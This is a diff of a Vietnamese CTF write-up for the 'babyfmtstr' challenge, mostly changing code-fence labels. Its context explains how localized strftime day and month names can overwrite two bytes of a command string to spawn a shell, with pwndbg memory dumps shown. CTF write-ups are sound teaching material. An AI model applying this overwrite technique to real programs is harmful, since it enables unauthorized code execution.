@@ -1,6 +1,6 @@
 # write up babyfmtstr - fmtstr locale battle 
 - first em sẽ đươc phép nhập format nhưng là format trong locale của libc nên khi qua hàm strftime nó sẽ được chuyển thành định dạng thời gian như ngày giờ, nên format string không sử dụng được như tên bài
-```bash 
+```assembly 
 00:0000│  0x5555555580e0 (output) ◂— '04/21/2404/21/2404/21/2404/21/2404/21/24%%%%%'
 01:0008│  0x5555555580e8 (output+8) ◂— '04/21/2404/21/2404/21/2404/21/24%%%%%'
 02:0010│  0x5555555580f0 (output+16) ◂— '04/21/2404/21/2404/21/24%%%%%'
@@ -32,7 +32,6 @@ Formatted: Sunday
 - Sẽ có 2 chữ có chữ s và chữ h trong chuỗi và ở vị trí thích hợp:
 1. Didòmhnaic[h] tương ứng với sunday trong tiếng anh format %A
 2. áprili[s] tương ứng với April trong tiếng anh format %B
-```
 - có thể sẽ mất nhiều thời gian để tìm, và cũng có thể vào 1 ngày khác trong tương lai sẽ có 1 ngày như vậy, với bài này chỉ dùng được cho chủ nhật vì hiện tại người làm đang ở ngày chủ nhật 
 ```bash
 In [13]: hex(u64(b"aaprilis"))
@@ -51,7 +50,7 @@ Out[5]: '0x6873'
 - vì vậy ta chỉ cần overwrite 2 bytes cuối là có thể thực thi command
 - vì vậy lần đầu overwrite ta sẽ chọn chữ số 1 để overwrite 
 
-```bash
+```assembly
 pwndbg> tel &output
 00:0000│  0x5555555580e0 (output) ◂— 0x34322f31322f3430 ('04/21/24')
 01:0008│  0x5555555580e8 (output+8) ◂— 0x34322f31322f3430 ('04/21/24')
@@ -61,7 +60,7 @@ pwndbg> tel &output
 ```
 - để write được thì cần padding thích hợp sao cho chữ bytes cuối là chữ h rơi vào chữ l của command ban đầu 
 
-```bash
+```assembly
 pwndbg> tel &output
 00:0000│  0x5555555580e0 (output) ◂— 0x34322f31322f3430 ('04/21/24')
 01:0008│  0x5555555580e8 (output+8) ◂— 0x34322f31322f3430 ('04/21/24')
